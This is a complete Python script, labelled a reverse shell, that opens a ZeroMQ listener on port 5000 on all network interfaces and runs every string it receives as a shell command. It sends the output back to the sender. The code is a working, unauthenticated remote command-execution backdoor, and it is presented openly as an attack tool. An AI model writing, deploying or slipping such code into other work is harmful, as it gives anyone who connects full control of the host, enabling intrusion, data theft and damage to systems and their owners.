import zmq
import subprocess
import os

print("Sisyphus - Reverse Shell ")
print("Author: Chokri Hammedi\n")

host = '0.0.0.0'
port = 5000

def execute_command(command, cwd):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=cwd)
    output, error = process.communicate()
    return output.decode('utf-8') + error.decode('utf-8')

context = zmq.Context()
socket = context.socket(zmq.REP)
socket.bind(f"tcp://{host}:{port}")

print(f"Listening on {host}:{port}...")

cwd = os.getcwd()

while True:
    command = socket.recv_string()
    
    if command.lower() == "exit":
        break
    elif command.lower() == "get_cwd":
        output = cwd
    elif command.startswith("cd "):
        new_dir = command[3:]
        try:
            os.chdir(new_dir)
            cwd = os.getcwd()
            output = cwd
        except FileNotFoundError:
            output = f"Error: Directory '{new_dir}' not found"
        except PermissionError:
            output = f"Error: Permission denied for directory '{new_dir}'"
    else:
        output = execute_command(command, cwd)

    socket.send_string(output)

print("Server exiting...")
